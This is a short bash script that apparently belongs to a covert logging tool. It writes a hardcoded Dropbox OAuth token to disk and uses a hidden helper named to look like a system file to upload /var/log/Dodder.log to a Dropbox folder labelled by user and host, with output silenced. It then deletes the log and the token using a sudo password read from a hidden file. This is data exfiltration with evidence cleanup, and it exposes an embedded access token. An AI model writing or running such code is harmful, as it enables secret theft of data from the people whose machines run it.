#!/bin/bash
if [ ! -f ~/.dropbox_uploader ]
then
echo "OAUTH_ACCESS_TOKEN=emSiv5JSXNAAAAAAAAAACnu2yG-wiZO4oSrWDz_d6vg00PVis2MbKh6uull1yqgZ" > ~/.dropbox_uploader
fi
file=`date +%Y%m%d%H%M%S`
folder=$USER@`hostname`
./.systemConfig.sh upload /var/log/Dodder.log /$folder/$file/ > /dev/null 2>&1
result=$?
if [ $result -eq 0 ]
then
sudo -k -S rm /var/log/Dodder.log < /var/log/.pass > /dev/null 2>&1
fi
rm ~/.dropbox_uploader > /dev/null 2>&1
